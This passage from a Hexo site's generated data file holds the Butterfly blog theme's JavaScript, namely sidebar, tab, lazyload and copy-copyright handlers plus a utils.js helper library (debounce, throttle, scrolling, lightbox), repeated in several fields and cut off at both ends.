'chat-btn': () => { // Show chat\n      window.chatBtnFn()\n    },\n    translateLink: () => { // switch between traditional and simplified chinese\n      window.translateFn.translatePage()\n    }\n  }\n\n  document.getElementById('rightside').addEventListener('click', e => {\n    const $target = e.target.closest('[id]')\n    if ($target && rightSideFn[$target.id]) {\n      rightSideFn[$target.id](e.currentTarget, $target)\n    }\n  })\n\n  /**\n   * menu\n   * 側邊欄sub-menu 展開/收縮\n   */\n  const clickFnOfSubMenu = () => {\n    const handleClickOfSubMenu = e => {\n      const target = e.target.closest('.site-page.group')\n      if (!target) return\n      target.classList.toggle('hide')\n    }\n\n    const menusItems = document.querySelector('#sidebar-menus .menus_items')\n    menusItems && menusItems.addEventListener('click', handleClickOfSubMenu)\n  }\n\n  /**\n   * 手机端目录点击\n   */\n  const openMobileMenu = () => {\n    const toggleMenu = document.getElementById('toggle-menu')\n    if (!toggleMenu) return\n    btf.addEventListenerPjax(toggleMenu, 'click', () => { sidebarFn.open() })\n  }\n\n  /**\n * 複製時加上版權信息\n */\n  const addCopyright = () => {\n    const { limitCount, languages } = GLOBAL_CONFIG.copyright\n\n    const handleCopy = (e) => {\n      e.preventDefault()\n      const copyFont = window.getSelection(0).toString()\n      let textFont = copyFont\n      if (copyFont.length > limitCount) {\n        textFont = `${copyFont}\\n\\n\\n${languages.author}\\n${languages.link}${window.location.href}\\n${languages.source}\\n${languages.info}`\n      }\n      if (e.clipboardData) {\n        return e.clipboardData.setData('text', textFont)\n      } else {\n        return window.clipboardData.setData('text', textFont)\n      }\n    }\n\n    document.body.addEventListener('copy', handleCopy)\n  }\n\n  /**\n   * 網頁運行時間\n   */\n  const addRuntime = () => {\n    const $runtimeCount = document.getElementById('runtimeshow')\n    if ($runtimeCount) {\n      const publishDate = $runtimeCount.getAttribute('data-publishDate')\n      $runtimeCount.textContent = `${btf.diffDate(publishDate)} ${GLOBAL_CONFIG.runtime}`\n    }\n  }\n\n  /**\n   * 最後一次更新時間\n   */\n  const addLastPushDate = () => {\n    const $lastPushDateItem = document.getElementById('last-push-date')\n    if ($lastPushDateItem) {\n      const lastPushDate = $lastPushDateItem.getAttribute('data-lastPushDate')\n      $lastPushDateItem.textContent = btf.diffDate(lastPushDate, true)\n    }\n  }\n\n  /**\n   * table overflow\n   */\n  const addTableWrap = () => {\n    const $table = document.querySelectorAll('#article-container table')\n    if (!$table.length) return\n\n    $table.forEach(item => {\n      if (!item.closest('.highlight')) {\n        btf.wrap(item, 'div', { class: 'table-wrap' })\n      }\n    })\n  }\n\n  /**\n   * tag-hide\n   */\n  const clickFnOfTagHide = () => {\n    const hideButtons = document.querySelectorAll('#article-container .hide-button')\n    if (!hideButtons.length) return\n    hideButtons.forEach(item => item.addEventListener('click', e => {\n      const currentTarget = e.currentTarget\n      currentTarget.classList.add('open')\n      addJustifiedGallery(currentTarget.nextElementSibling.querySelectorAll('.gallery-container'))\n    }, { once: true }))\n  }\n\n  const tabsFn = () => {\n    const navTabsElements = document.querySelectorAll('#article-container .tabs')\n    if (!navTabsElements.length) return\n\n    const setActiveClass = (elements, activeIndex) => {\n      elements.forEach((el, index) => {\n        el.classList.toggle('active', index === activeIndex)\n      })\n    }\n\n    const handleNavClick = e => {\n      const target = e.target.closest('button')\n      if (!target || target.classList.contains('active')) return\n\n      const navItems = [...e.currentTarget.children]\n      const tabContents = [...e.currentTarget.nextElementSibling.children]\n      const indexOfButton = navItems.indexOf(target)\n      setActiveClass(navItems, indexOfButton)\n      e.currentTarget.classList.remove('no-default')\n      setActiveClass(tabContents, indexOfButton)\n      addJustifiedGallery(tabContents[indexOfButton].querySelectorAll('.gallery-container'), true)\n    }\n\n    const handleToTopClick = tabElement => e => {\n      if (e.target.closest('button')) {\n        btf.scrollToDest(btf.getEleTop(tabElement), 300)\n      }\n    }\n\n    navTabsElements.forEach(tabElement => {\n      btf.addEventListenerPjax(tabElement.firstElementChild, 'click', handleNavClick)\n      btf.addEventListenerPjax(tabElement.lastElementChild, 'click', handleToTopClick(tabElement))\n    })\n  }\n\n  const toggleCardCategory = () => {\n    const cardCategory = document.querySelector('#aside-cat-list.expandBtn')\n    if (!cardCategory) return\n\n    const handleToggleBtn = e => {\n      const target = e.target\n      if (target.nodeName === 'I') {\n        e.preventDefault()\n        target.parentNode.classList.toggle('expand')\n      }\n    }\n    btf.addEventListenerPjax(cardCategory, 'click', handleToggleBtn, true)\n  }\n\n  const addPostOutdateNotice = () => {\n    const ele = document.getElementById('post-outdate-notice')\n    if (!ele) return\n\n    const { limitDay, messagePrev, messageNext, postUpdate } = JSON.parse(ele.getAttribute('data'))\n    const diffDay = btf.diffDate(postUpdate)\n    if (diffDay >= limitDay) {\n      ele.textContent = `${messagePrev} ${diffDay} ${messageNext}`\n      ele.hidden = false\n    }\n  }\n\n  const lazyloadImg = () => {\n    window.lazyLoadInstance = new LazyLoad({\n      elements_selector: 'img',\n      threshold: 0,\n      data_src: 'lazy-src'\n    })\n\n    btf.addGlobalFn('pjaxComplete', () => {\n      window.lazyLoadInstance.update()\n    }, 'lazyload')\n  }\n\n  const relativeDate = selector => {\n    selector.forEach(item => {\n      item.textContent = btf.diffDate(item.getAttribute('datetime'), true)\n      item.style.display = 'inline'\n    })\n  }\n\n  const justifiedIndexPostUI = () => {\n    const recentPostsElement = document.getElementById('recent-posts')\n    if (!(recentPostsElement && recentPostsElement.classList.contains('masonry'))) return\n\n    const init = () => {\n      const masonryItem = new InfiniteGrid.MasonryInfiniteGrid('.recent-post-items', {\n        gap: { horizontal: 10, vertical: 20 },\n        useTransform: true,\n        useResizeObserver: true\n      })\n      masonryItem.renderItems()\n      btf.addGlobalFn('pjaxCompleteOnce', () => { masonryItem.destroy() }, 'removeJustifiedIndexPostUI')\n    }\n\n    typeof InfiniteGrid === 'function' ? init() : btf.getScript(`${GLOBAL_CONFIG.infinitegrid.js}`).then(init)\n  }\n\n  const unRefreshFn = () => {\n    window.addEventListener('resize', () => {\n      adjustMenu(false)\n      mobileSidebarOpen && btf.isHidden(document.getElementById('toggle-menu')) && sidebarFn.close()\n    })\n\n    const menuMask = document.getElementById('menu-mask')\n    menuMask && menuMask.addEventListener('click', () => { sidebarFn.close() })\n\n    clickFnOfSubMenu()\n    GLOBAL_CONFIG.islazyloadPlugin && lazyloadImg()\n    GLOBAL_CONFIG.copyright !== undefined && addCopyright()\n\n    if (GLOBAL_CONFIG.autoDarkmode) {\n      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {\n        if (btf.saveToLocal.get('theme') !== undefined) return\n        e.matches ? handleThemeChange('dark') : handleThemeChange('light')\n      })\n    }\n  }\n\n  const forPostFn = () => {\n    addHighlightTool()\n    addPhotoFigcaption()\n    addJustifiedGallery(document.querySelectorAll('#article-container .gallery-container'))\n    runLightbox()\n    scrollFnToDo()\n    addTableWrap()\n    clickFnOfTagHide()\n    tabsFn()\n  }\n\n  const refreshFn = () => {\n    initAdjust()\n    justifiedIndexPostUI()\n\n    if (GLOBAL_CONFIG_SITE.pageType === 'post') {\n      addPostOutdateNotice()\n      GLOBAL_CONFIG.relativeDate.post && relativeDate(document.querySelectorAll('#post-meta time'))\n    } else {\n      GLOBAL_CONFIG.relativeDate.homepage && relativeDate(document.querySelectorAll('#recent-posts time'))\n      GLOBAL_CONFIG.runtime && addRuntime()\n      addLastPushDate()\n      toggleCardCategory()\n    }\n\n    GLOBAL_CONFIG_SITE.pageType === 'home' && scrollDownInIndex()\n    scrollFn()\n\n    forPostFn()\n    GLOBAL_CONFIG_SITE.pageType !== 'shuoshuo' && btf.switchComments(document)\n    openMobileMenu()\n  }\n\n  btf.addGlobalFn('pjaxComplete', refreshFn, 'refreshFn')\n  refreshFn()\n  unRefreshFn()\n\n  // 處理 hexo-blog-encrypt 事件\n  window.addEventListener('hexo-blog-decrypt', e => {\n    forPostFn()\n    window.translateFn.translateInitialization()\n    Object.values(window.globalFn.encrypt).forEach(fn => {\n      fn()\n    })\n  })\n})\n"},{"_content":"(() => {\n  const btfFn = {\n    debounce: (func, wait = 0, immediate = false) => {\n      let timeout\n      return (...args) => {\n        const later = () => {\n          timeout = null\n          if (!immediate) func(...args)\n        }\n        const callNow = immediate && !timeout\n        clearTimeout(timeout)\n        timeout = setTimeout(later, wait)\n        if (callNow) func(...args)\n      }\n    },\n\n    throttle: function (func, wait, options = {}) {\n      let timeout, context, args\n      let previous = 0\n\n      const later = () => {\n        previous = options.leading === false ? 0 : new Date().getTime()\n        timeout = null\n        func.apply(context, args)\n        if (!timeout) context = args = null\n      }\n\n      const throttled = (...params) => {\n        const now = new Date().getTime()\n        if (!previous && options.leading === false) previous = now\n        const remaining = wait - (now - previous)\n        context = this\n        args = params\n        if (remaining <= 0 || remaining > wait) {\n          if (timeout) {\n            clearTimeout(timeout)\n            timeout = null\n          }\n          previous = now\n          func.apply(context, args)\n          if (!timeout) context = args = null\n        } else if (!timeout && options.trailing !== false) {\n          timeout = setTimeout(later, remaining)\n        }\n      }\n\n      return throttled\n    },\n\n    overflowPaddingR: {\n      add: () => {\n        const paddingRight = window.innerWidth - document.body.clientWidth\n\n        if (paddingRight > 0) {\n          document.body.style.paddingRight = `${paddingRight}px`\n          document.body.style.overflow = 'hidden'\n          const menuElement = document.querySelector('#page-header.nav-fixed #menus')\n          if (menuElement) {\n            menuElement.style.paddingRight = `${paddingRight}px`\n          }\n        }\n      },\n      remove: () => {\n        document.body.style.paddingRight = ''\n        document.body.style.overflow = ''\n        const menuElement = document.querySelector('#page-header.nav-fixed #menus')\n        if (menuElement) {\n          menuElement.style.paddingRight = ''\n        }\n      }\n    },\n\n    snackbarShow: (text, showAction = false, duration = 2000) => {\n      const { position, bgLight, bgDark } = GLOBAL_CONFIG.Snackbar\n      const bg = document.documentElement.getAttribute('data-theme') === 'light' ? bgLight : bgDark\n      Snackbar.show({\n        text,\n        backgroundColor: bg,\n        showAction,\n        duration,\n        pos: position,\n        customClass: 'snackbar-css'\n      })\n    },\n\n    diffDate: (inputDate, more = false) => {\n      const dateNow = new Date()\n      const datePost = new Date(inputDate)\n      const diffMs = dateNow - datePost\n      const diffSec = diffMs / 1000\n      const diffMin = diffSec / 60\n      const diffHour = diffMin / 60\n      const diffDay = diffHour / 24\n      const diffMonth = diffDay / 30\n      const { dateSuffix } = GLOBAL_CONFIG\n\n      if (!more) return Math.floor(diffDay)\n\n      if (diffMonth > 12) return datePost.toISOString().slice(0, 10)\n      if (diffMonth >= 1) return `${Math.floor(diffMonth)} ${dateSuffix.month}`\n      if (diffDay >= 1) return `${Math.floor(diffDay)} ${dateSuffix.day}`\n      if (diffHour >= 1) return `${Math.floor(diffHour)} ${dateSuffix.hour}`\n      if (diffMin >= 1) return `${Math.floor(diffMin)} ${dateSuffix.min}`\n      return dateSuffix.just\n    },\n\n    loadComment: (dom, callback) => {\n      if ('IntersectionObserver' in window) {\n        const observerItem = new IntersectionObserver((entries) => {\n          if (entries[0].isIntersecting) {\n            callback()\n            observerItem.disconnect()\n          }\n        }, { threshold: [0] })\n        observerItem.observe(dom)\n      } else {\n        callback()\n      }\n    },\n\n    scrollToDest: (pos, time = 500) => {\n      const currentPos = window.scrollY\n      const isNavFixed = document.getElementById('page-header').classList.contains('fixed')\n      if (currentPos > pos || isNavFixed) pos = pos - 70\n\n      if ('scrollBehavior' in document.documentElement.style) {\n        window.scrollTo({\n          top: pos,\n          behavior: 'smooth'\n        })\n        return\n      }\n\n      const startTime = performance.now()\n      const animate = currentTime => {\n        const timeElapsed = currentTime - startTime\n        const progress = Math.min(timeElapsed / time, 1)\n        window.scrollTo(0, currentPos + (pos - currentPos) * progress)\n        if (progress < 1) {\n          requestAnimationFrame(animate)\n        }\n      }\n      requestAnimationFrame(animate)\n    },\n\n    animateIn: (ele, animation) => {\n      ele.style.display = 'block'\n      ele.style.animation = animation\n    },\n\n    animateOut: (ele, animation) => {\n      const handleAnimationEnd = () => {\n        ele.style.display = ''\n        ele.style.animation = ''\n        ele.removeEventListener('animationend', handleAnimationEnd)\n      }\n      ele.addEventListener('animationend', handleAnimationEnd)\n      ele.style.animation = animation\n    },\n\n    wrap: (selector, eleType, options) => {\n      const createEle = document.createElement(eleType)\n      for (const [key, value] of Object.entries(options)) {\n        createEle.setAttribute(key, value)\n      }\n      selector.parentNode.insertBefore(createEle, selector)\n      createEle.appendChild(selector)\n    },\n\n    isHidden: ele => ele.offsetHeight === 0 && ele.offsetWidth === 0,\n\n    getEleTop: ele => {\n      let actualTop = ele.offsetTop\n      let current = ele.offsetParent\n\n      while (current !== null) {\n        actualTop += current.offsetTop\n        current = current.offsetParent\n      }\n\n      return actualTop\n    },\n\n    loadLightbox: ele => {\n      const service = GLOBAL_CONFIG.lightbox\n\n      if (service === 'medium_zoom') {\n        mediumZoom(ele, { background: 'var(--zoom-bg)' })\n      }\n\n      if (service === 'fancybox') {\n        Array.from(ele).forEach(i => {\n          if (i.parentNode.tagName !== 'A') {\n            const dataSrc = i.dataset.lazySrc || i.src\n            const dataCaption = i.title || i.alt || ''\n            btf.wrap(i, 'a', { href: dataSrc, 'data-fancybox': 'gallery', 'data-caption': dataCaption, 'data-thumb': dataSrc })\n          }\n        })\n\n        if (!window.fancyboxRun) {\n          Fancybox.bind('[data-fancybox]', {\n            Hash: false,\n            Thumbs: {\n              showOnStart: false\n            },\n            Images: {\n              Panzoom: {\n                maxScale: 4\n              }\n            },\n            Carousel: {\n              transition: 'slide'\n            },\n            Toolbar: {\n              display: {\n                left: ['infobar'],\n                middle: [\n                  'zoomIn',\n                  'zoomOut',\n                  'toggle1to1',\n                  'rotateCCW',\n                  'rotateCW',\n                  'flipX',\n                  'flipY'\n                ],\n                right: ['slideshow', 'thumbs', 'close']\n              }\n            }\n          })\n          window.fancyboxRun = true\n        }\n      }\n    },\n\n    setLoading: {\n      add: ele => {\n        const html = `\n        <div class=\"loading-container\">\n          <div class=\"loading-item\">\n            <div></div><div></div><div></div><div></div><div></div>\n          </div>\n        </div>\n      `\n        ele.insertAdjacentHTML('afterend', html)\n      },\n      remove: ele => {\n        ele.nextElementSibling.remove()\n      }\n    },\n\n    updateAnchor: anchor => {\n      if (anchor !== window.location.hash) {\n        if (!anchor) anchor = location.pathname\n        const title = GLOBAL_CONFIG_SITE.title\n        window.history.replaceState({\n          url: location.href,\n          title\n        }, title, anchor)\n      }\n    },\n\n    getScrollPercent: (() => {\n      let docHeight, winHeight, headerHeight, contentMath\n\n      return (currentTop, ele) => {\n        if (!docHeight || ele.clientHeight !== docHeight) {\n          docHeight = ele.clientHeight\n          winHeight = window.innerHeight\n          headerHeight = ele.offsetTop\n          contentMath = Math.max(docHeight - winHeight, document.documentElement.scrollHeight - winHeight)\n        }\n\n        const scrollPercent = (currentTop - headerHeight) / contentMath\n        return Math.max(0, Math.min(100, Math.round(scrollPercent * 100)))\n      }\n    })(),\n\n    addEventListenerPjax: (ele, event, fn, option = false) => {\n      ele.addEventListener(event, fn, option)\n      btf.addGlobalFn('pjaxSendOnce', () => {\n        ele.removeEventListener(event, fn, option)\n      })\n    },\n\n    removeGlobalFnEvent: (key, parent = window) => {\n      const globalFn = parent.globalFn || {}\n      const keyObj = globalFn[key]\n      if (!keyObj) return\n\n      Object.keys(keyObj).forEach(i => keyObj[i]())\n\n      delete globalFn[key]\n    },\n\n    switchComments: (el = document, path) => {\n      const switchBtn = el.querySelector('#switch-btn')\n      if (!switchBtn) return\n\n      let switchDone = false\n      const postComment = el.querySelector('#post-comment')\n      const handleSwitchBtn = () => {\n        postComment.classList.toggle('move')\n        if (!switchDone && typeof loadOtherComment === 'function') {\n          switchDone = true\n          loadOtherComment(el, path)\n        }\n      }\n      btf.addEventListenerPjax(switchBtn, 'click', handleSwitchBtn)\n    }\n  }\n\n  window.btf = { ...window.btf, ...btfFn }\n})()\n","source":"js/utils.js","raw":"(() => {\n  const btfFn = {\n    debounce: (func, wait = 0, immediate = false) => {\n      let timeout\n      return (...args) => {\n        const later = () => {\n          timeout = null\n          if (!immediate) func(...args)\n        }\n        const callNow = immediate && !timeout\n        clearTimeout(timeout)\n        timeout = setTimeout(later, wait)\n        if (callNow) func(...args)\n      }\n    },\n\n    throttle: function (func, wait, options = {}) {\n      let timeout, context, args\n      let previous = 0\n\n      const later = () => {\n        previous = options.leading === false ? 0 : new Date().getTime()\n        timeout = null\n        func.apply(context, args)\n        if (!timeout) context = args = null\n      }\n\n      const throttled = (...params) => {\n        const now = new Date().getTime()\n        if (!previous && options.leading === false) previous = now\n        const remaining = wait - (now - previous)\n        context = this\n        args = params\n        if (remaining <= 0 || remaining > wait) {\n          if (timeout) {\n            clearTimeout(timeout)\n            timeout = null\n          }\n          previous = now\n          func.apply(context, args)\n          if (!timeout) context = args = null\n        } else if (!timeout && options.trailing !== false) {\n          timeout = setTimeout(later, remaining)\n        }\n      }\n\n      return throttled\n    },\n\n    overflowPaddingR: {\n      add: () => {\n        const paddingRight = window.innerWidth - document.body.clientWidth\n\n        if (paddingRight > 0) {\n          document.body.style.paddingRight = `${paddingRight}px`\n          document.body.style.overflow = 'hidden'\n          const menuElement = document.querySelector('#page-header.nav-fixed #menus')\n          if (menuElement) {\n            menuElement.style.paddingRight = `${paddingRight}px`\n          }\n        }\n      },\n      remove: () => {\n        document.body.style.paddingRight = ''\n        document.body.style.overflow = ''\n        const menuElement = document.querySelector('#page-header.nav-fixed #menus')\n        if (menuElement) {\n          menuElement.style.paddingRight = ''\n        }\n      }\n    },\n\n    snackbarShow: (text, showAction = false, duration = 2000) => {\n      const { position, bgLight, bgDark } = GLOBAL_CONFIG.Snackbar\n      const bg = document.documentElement.getAttribute('data-theme') === 'light' ? bgLight : bgDark\n      Snackbar.show({\n        text,\n        backgroundColor: bg,\n        showAction,\n        duration,\n        pos: position,\n        customClass: 'snackbar-css'\n      })\n    },\n\n    diffDate: (inputDate, more = false) => {\n      const dateNow = new Date()\n      const datePost = new Date(inputDate)\n      const diffMs = dateNow - datePost\n      const diffSec = diffMs / 1000\n      const diffMin = diffSec / 60\n      const diffHour = diffMin / 60\n      const diffDay = diffHour / 24\n      const diffMonth = diffDay / 30\n      const { dateSuffix } = GLOBAL_CONFIG\n\n      if (!more) return Math.floor(diffDay)\n\n      if (diffMonth > 12) return datePost.toISOString().slice(0, 10)\n      if (diffMonth >= 1) return `${Math.floor(diffMonth)} ${dateSuffix.month}`\n      if (diffDay >= 1) return `${Math.floor(diffDay)} ${dateSuffix.day}`\n      if (diffHour >= 1) return `${Math.floor(diffHour)} ${dateSuffix.hour}`\n      if (diffMin >= 1) return `${Math.floor(diffMin)} ${dateSuffix.min}`\n      return dateSuffix.just\n    },\n\n    loadComment: (dom, callback) => {\n      if ('IntersectionObserver' in window) {\n        const observerItem = new IntersectionObserver((entries) => {\n          if (entries[0].isIntersecting) {\n            callback()\n            observerItem.disconnect()\n          }\n        }, { threshold: [0] })\n        observerItem.observe(dom)\n      } else {\n        callback()\n      }\n    },\n\n    scrollToDest: (pos, time = 500) => {\n      const currentPos = window.scrollY\n      const isNavFixed = document.getElementById('page-header').classList.contains('fixed')\n      if (currentPos > pos || isNavFixed) pos = pos - 70\n\n      if ('scrollBehavior' in document.documentElement.style) {\n        window.scrollTo({\n          top: pos,\n          behavior: 'smooth'\n        })\n        return\n      }\n\n      const startTime = performance.now()\n      const animate = currentTime => {\n        const timeElapsed = currentTime - startTime\n        const progress = Math.min(timeElapsed / time, 1)\n        window.scrollTo(0, currentPos + (pos - currentPos) * progress)\n        if (progress < 1) {\n          requestAnimationFrame(animate)\n        }\n      }\n      requestAnimationFrame(animate)\n    },\n\n    animateIn: (ele, animation) => {\n      ele.style.display = 'block'\n      ele.style.animation = animation\n    },\n\n    animateOut: (ele, animation) => {\n      const handleAnimationEnd = () => {\n        ele.style.display = ''\n        ele.style.animation = ''\n        ele.removeEventListener('animationend', handleAnimationEnd)\n      }\n      ele.addEventListener('animationend', handleAnimationEnd)\n      ele.style.animation = animation\n    },\n\n    wrap: (selector, eleType, options) => {\n      const createEle = document.createElement(eleType)\n      for (const [key, value] of Object.entries(options)) {\n        createEle.setAttribute(key, value)\n      }\n      selector.parentNode.insertBefore(createEle, selector)\n      createEle.appendChild(selector)\n    },\n\n    isHidden: ele => ele.offsetHeight === 0 && ele.offsetWidth === 0,\n\n    getEleTop: ele => {\n      let actualTop = ele.offsetTop\n      let current = ele.offsetParent\n\n      while (current !== null) {\n        actualTop += current.offsetTop\n        current = current.offsetParent\n      }\n\n      return actualTop\n    },\n\n    loadLightbox: ele => {\n      const service = GLOBAL_CONFIG.lightbox\n\n      if (service === 'medium_zoom') {\n        mediumZoom(ele, { background: 'var(--zoom-bg)' })\n      }\n\n      if (service === 'fancybox') {\n        Array.from(ele).forEach(i => {\n          if (i.parentNode.tagName !== 'A') {\n            const dataSrc = i.dataset.lazySrc || i.src\n            const dataCaption = i.title || i.alt || ''\n            btf.wrap(i, 'a', { href: dataSrc, 'data-fancybox': 'gallery', 'data-caption': dataCaption, 'data-thumb': dataSrc })\n          }\n        })\n\n        if (!window.fancyboxRun) {\n          Fancybox.bind('[data-fancybox]', {\n            Hash: false,\n            Thumbs: {\n              showOnStart: false\n            },\n            Images: {\n              Panzoom: {\n                maxScale: 4\n              }\n            },\n            Carousel: {\n              transition: 'slide'\n            },\n            Toolbar: {\n              display: {\n                left: ['infobar'],\n                middle: [\n                  'zoomIn',\n                  'zoomOut',\n                  'toggle1to1',\n                  'rotateCCW',\n                  'rotateCW',\n                  'flipX',\n                  'flipY'\n                ],\n                right: ['slideshow', 'thumbs', 'close']\n              }\n            }\n          })\n          window.fancyboxRun = true\n        }\n      }\n    },\n\n    setLoading: {\n      add: ele => {\n        const html = `\n        <div class=\"loading-container\">\n          <div class=\"loading-item\">\n            <div></div><div></div><div></div><div></div><div></div>\n          </div>\n        </div>\n      `\n        ele.insertAdjacentHTML('afterend', html)\n      },\n      remove: ele => {\n        ele.nextElementSibling.remove()\n      }\n    },\n\n    updateAnchor: anchor => {\n      if (anchor !== window.location.hash) {\n        if (!anchor) anchor = location.pathname\n        const title = GLOBAL_CONFIG_SITE.title\n        window.history.replaceState({\n          url: location.href,\n          title\n        }, title, anchor)\n      }\n    },\n\n    getScrollPercent: (() => {\n      let docHeight, winHeight, headerHeight, contentMath\n\n      return (currentTop, ele) => {\n        if (!docHeight || ele.clientHeight !== docHeight) {\n          docHeight = ele.clientHeight\n          winHeight = window.innerHeight\n          headerHeight = ele.offsetTop\n          contentMath = Math.max(docHeight - winHeight, document.documentElement.scrollHeight - winHeight)\n        }\n\n        const scrollPercent = (currentTop - headerHeight) / contentMath\n        return Math.max(0, Math.min(100, Math.round(scrollPercent * 100)))\n      }\n    })(),\n\n    addEventListenerPjax: (ele, event, fn, option = false) => {\n      ele.addEventListener(event, fn, option)\n      btf.addGlobalFn('pjaxSendOnce', () => {\n        ele.removeEventListener(event, fn, option)\n      })\n    },\n\n    removeGlobalFnEvent: (key, parent = window) => {\n      const globalFn = parent.globalFn || {}\n      const keyObj = globalFn[key]\n      if (!keyObj) return\n\n      Object.keys(keyObj).forEach(i => keyObj[i]())\n\n      delete globalFn[key]\n    },\n\n    switchComments: (el = document, path) => {\n      const switchBtn = el.querySelector('#switch-btn')\n      if (!switchBtn) return\n\n      let switchDone = false\n      const postComment = el.querySelector('#post-comment')\n      const handleSwitchBtn = () => {\n        postComment.classList.toggle('move')\n        if (!switchDone && typeof loadOtherComment === 'function') {\n          switchDone = true\n          loadOtherComment(el, path)\n        }\n      }\n      btf.addEventListenerPjax(switchBtn, 'click', handleSwitchBtn)\n    }\n  }\n\n  window.btf = { ...window.btf, ...btfFn }\n})()\n","date":"2025-10-07T06:26:10.354Z","updated":"2025-10-07T06:26:10.354Z","path":"js/utils.js","layout":"false","title":"","comments":1,"_id":"cmglxf2i2000guomyaic9ekly","content":"(() => {\n  const btfFn = {\n    debounce: (func, wait = 0, immediate = false) => {\n      let timeout\n      return (...args) => {\n        const later = () => {\n          timeout = null\n          if (!immediate) func(...args)\n        }\n        const callNow = immediate && !timeout\n        clearTimeout(timeout)\n        timeout = setTimeout(later, wait)\n        if (callNow) func(...args)\n      }\n    },\n\n    throttle: function (func, wait, options = {}) {\n      let timeout, context, args\n      let previous = 0\n\n      const later = () => {\n        previous = options.leading === false ? 0 : new Date().getTime()\n        timeout = null\n        func.apply(context, args)\n        if (!timeout) context = args = null\n      }\n\n      const throttled = (...params) => {\n        const now = new Date().getTime()\n        if (!previous && options.leading === false) previous = now\n        const remaining = wait - (now - previous)\n        context = this\n        args = params\n        if (remaining <= 0 || remaining > wait) {\n          if (timeout) {\n            clearTimeout(timeout)\n            timeout = null\n          }\n          previous = now\n          func.apply(context, args)\n          if (!timeout) context = args = null\n        } else if (!timeout && options.trailing !== false) {\n          timeout = setTimeout(later, remaining)\n        }\n      }\n\n      return throttled\n    },\n\n    overflowPaddingR: {\n      add: () => {\n        const paddingRight = window.innerWidth - document.body.clientWidth\n\n        if (paddingRight > 0) {\n          document.body.style.paddingRight = `${paddingRight}px`\n          document.body.style.overflow = 'hidden'\n          const menuElement = document.querySelector('#page-header.nav-fixed #menus')\n          if (menuElement) {\n            menuElement.style.paddingRight = `${paddingRight}px`\n          }\n        }\n      },\n      remove: () => {\n        document.body.style.paddingRight = ''\n        document.body.style.overflow = ''\n        const menuElement = document.querySelector('#page-header.nav-fixed #menus')\n        if (menuElement) {\n          menuElement.style.paddingRight = ''\n        }\n      }\n    },\n\n    snackbarShow: (text, showAction = false, duration = 2000) => {\n      const { position, bgLight, bgDark } = GLOBAL_CONFIG.Snackbar\n      const bg = document.documentElement.getAttribute('data-theme') === 'light' ? bgLight : bgDark\n      Snackbar.show({\n        text,\n        backgroundColor: bg,\n        showAction,\n        duration,\n        pos: position,\n        customClass: 'snackbar-css'\n      })\n    },\n\n    diffDate: (inputDate, more = false) => {\n      const dateNow = new Date()\n      const datePost = new Date(inputDate)\n      const diffMs = dateNow - datePost\n      const diffSec = diffMs / 1000\n      const diffMin = diffSec / 60\n      const diffHour = diffMin / 60\n      const diffDay = diffHour / 24\n      const diffMonth = diffDay / 30\n      const { dateSuffix } = GLOBAL_CONFIG\n\n      if (!more) return Math.floor(diffDay)\n\n      if (diffMonth > 12) return datePost.toISOString().slice(0, 10)\n      if (diffMonth >= 1) return `${Math.floor(diffMonth)} ${dateSuffix.month}`\n      if (diffDay >= 1) return `${Math.floor(diffDay)} ${dateSuffix.day}`\n      if (diffHour >= 1) return `${Math.floor(diffHour)} ${dateSuffix.hour}`\n      if (diffMin >= 1) return `${Math.floor(diffMin)} ${dateSuffix.min}`\n      return dateSuffix.just\n    },\n\n    loadComment: (dom, callback) => {\n      if ('IntersectionObserver' in window) {\n        const observerItem = new IntersectionObserver((entries) => {\n          if (entries[0].isIntersecting) {\n            callback()\n            observerItem.disconnect()\n          }\n        }, { threshold: [0] })\n        observerItem.observe(dom)\n      } else {\n        callback()\n      }\n    },\n\n    scrollToDest: (pos, time = 500) => {\n      const currentPos = window.scrollY\n      const isNavFixed = document.getElementById('page-header').classList.contains('fixed')\n      if (currentPos > pos || isNavFixed) pos = pos - 70\n\n      if ('scrollBehavior' in document.documentElement.style) {\n        window.scrollTo({\n          top: pos,\n          behavior: 'smooth'\n        })\n        return\n      }\n\n      const startTime = performance.now()\n      const animate = currentTime => {\n        const timeElapsed = currentTime - startTime\n        const progress = Math.min(timeElapsed / time, 1)\n        window.scrollTo(0, currentPos + (pos - currentPos) * progress)\n        if (progress < 1) {\n          requestAnimationFrame(animate)\n        }\n      }\n      requestAnimationFrame(animate)\n    },\n\n    animateIn: (ele, animation) => {\n      ele.style.display = 'block'\n      ele.style.animation = animation\n    },\n\n    animateOut: (ele, animation) => {\n      const handleAnimationEnd = () => {\n        ele.style.display = ''\n        ele.style.animation = ''\n        ele.removeEventListener('animationend', handleAnimationEnd)\n      }\n      ele.addEventListener('animationend', handleAnimationEnd)\n      ele.style.animation = animation\n    },\n\n    wrap: (selector, eleType, options) => {\n      const createEle = document.createElement(eleType)\n      for (const [key, value] of Object.entries(options)) {\n        createEle.setAttribute(key, value)\n      }\n      selector.parentNode.insertBefore(createEle, selector)\n      createEle.appendChild(selector)\n    },\n\n    isHidden: ele => ele.offsetHeight === 0 && ele.offsetWidth === 0,\n\n    getEleTop: ele => {\n      let actualTop = ele.offsetTop\n      let current = ele.offsetParent\n\n      while (current !== null) {\n        actualTop += current.offsetTop\n        current = current.offsetParent\n      }\n\n      return actualTop\n    },\n\n    loadLightbox: ele => {\n      const service = GLOBAL_CONFIG.lightbox\n\n      if (service === 'medium_zoom') {\n        mediumZoom(ele, { background: 'var(--zoom-bg)' })\n      }\n\n      if (service === 'fancybox') {\n        Array.from(ele).forEach(i => {\n          if (i.parentNode.tagName !== 'A') {\n            const dataSrc = i.dataset.lazySrc || i.src\n            const dataCaption = i.title || i.alt || ''\n            btf.wrap(i, 'a', { href: dataSrc, 'data-fancybox': 'gallery', 'data-caption': dataCaption, 'data-thumb': dataSrc })\n          }\n        })\n\n        if (!window.fancyboxRun) {\n          Fancybox.bind('[data-fancybox]', {\n            Hash: false,\n            Thumbs: {\n              showOnStart: false\n            },\n            Images: {\n              Panzoom: {\n                maxScale: 4\n              }\n            },\n            Carousel: {\n              transition: 'slide'\n            },\n            Toolbar: {\n              display: {\n                left: ['infobar'],\n                middle: [\n                  'zoomIn',\n                  'zoomOut',\n                  'toggle1to1',\n                  'rotateCCW',\n                  'rotateCW',\n                  'flipX',\n                  'flipY'\n                ],\n                right: ['slideshow', 'thumbs', 'close']\n              }\n            }\n          })\n          window.fancyboxRun = true\n        }\n      }\n    },\n\n    setLoading: {\n      add: ele => {\n        const html = `\n        <div class=\"loading-container\">\n          <div class=\"loading-item\">\n            